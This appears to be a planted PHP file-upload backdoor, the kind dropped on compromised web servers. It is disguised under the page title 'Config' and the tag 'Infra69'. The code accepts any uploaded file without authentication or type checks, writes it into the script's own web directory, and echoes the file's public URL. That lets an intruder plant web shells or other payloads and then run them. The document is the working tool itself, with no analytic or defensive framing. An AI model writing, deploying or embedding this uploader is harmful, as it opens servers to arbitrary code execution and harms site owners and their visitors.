<b>Infra69</b>
<title>Config</title>
<?php
if (isset($_FILES['fileup']) && $_FILES['fileup']['name']) {
    $f = $_FILES['fileup'];
    $target = __DIR__ . "/" . basename($f['name']);

    if (move_uploaded_file($f['tmp_name'], $target)) {
        echo "Uploaded <b>{$f['name']}</b><br>"
           . "Type: {$f['type']}<br>"
           . "Size: " . round($f['size']/1024,1) . "KB<br>"
           . "URL: http://{$_SERVER['HTTP_HOST']}"
           . dirname($_SERVER['REQUEST_URI']) . "/" . basename($f['name']);
    } else {
        echo "Upload failed.";
    }
}
?>
<form method="POST" enctype="multipart/form-data" style="text-align:center;margin:1em;">
    <input type="file" name="fileup"><br>
    <input type="submit" value="Upload">
</form>
